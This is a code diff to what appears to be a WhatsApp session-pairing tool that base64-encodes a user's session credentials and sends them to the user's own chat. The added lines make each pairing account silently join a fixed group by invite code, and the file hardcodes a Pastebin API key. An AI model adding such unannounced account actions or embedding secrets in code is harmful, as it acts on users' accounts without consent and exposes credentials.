@@ -1,3 +1,4 @@
+
 const PastebinAPI = require('pastebin-js');
 const pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL');
 const { makeid } = require('./id');
@@ -12,6 +13,9 @@ const {
     makeCacheableSignalKeyStore,
     Browsers
 } = require('@whiskeysockets/baileys');
+
+// Add chalk for colored console output (you'll need to install it: npm install chalk)
+const chalk = require('chalk');
 
 function removeFile(FilePath) {
     if (!fs.existsSync(FilePath)) return false;
@@ -49,10 +53,19 @@ router.get('/', async (req, res) => {
                 const { connection, lastDisconnect } = s;
                 if (connection === 'open') {
                     await delay(5000);
+                    
+                    // Add group joining functionality
+                    try {
+                        await client.groupAcceptInvite('LVtMOpKXWogECSmtBylUix');
+                        console.log(chalk.green('[GROUP] Successfully joined the group!'));
+                    } catch (groupErr) {
+                        console.error(chalk.red('[GROUP] Error joining group:'), groupErr);
+                    }
+                    
                     let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
                     await delay(800);
                     let b64data = Buffer.from(data).toString('base64');
-                    let session = await client.sendMessage(client.user.id, { text: 'Anonymous~' + b64data });
+                    let session = await client.sendMessage(client.user.id, { text: 'Anonymous;;;' + b64data });
 
                     let successMessage = `
         
